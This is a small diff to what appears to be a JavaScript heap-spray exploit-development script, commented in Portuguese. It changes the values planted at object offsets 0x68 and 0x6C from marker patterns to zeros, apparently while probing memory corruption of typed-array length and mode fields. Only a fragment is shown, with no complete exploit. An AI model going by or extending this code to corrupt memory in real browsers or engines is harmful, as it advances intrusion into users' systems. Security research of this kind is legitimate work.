@@ -70,8 +70,8 @@ export async function sprayAndInvestigateObjectExposure() {
     const OFFSET_0x70 = CORRUPTION_OFFSET_TRIGGER; // Potencial m_length + m_mode (ou parte alta de 0x6C afetada)
 
     // Valores que queremos plantar para ver se temos controle
-    const PLANT_VAL_0x68_LOW  = 0xAABBCCDD; // Para Mem[0x68-0x6B]
-    const PLANT_VAL_0x6C_LOW  = 0x11223344; // Para Mem[0x6C-0x6F] (que também é a parte alta do QWORD em 0x68)
+    const PLANT_VAL_0x68_LOW  = 0x00000000; // Para Mem[0x68-0x6B]
+    const PLANT_VAL_0x6C_LOW  = 0x00000000; // Para Mem[0x6C-0x6F] (que também é a parte alta do QWORD em 0x68)
                                         // E também a parte baixa do QWORD em 0x6C que será afetada pela corrupção
 
     try {
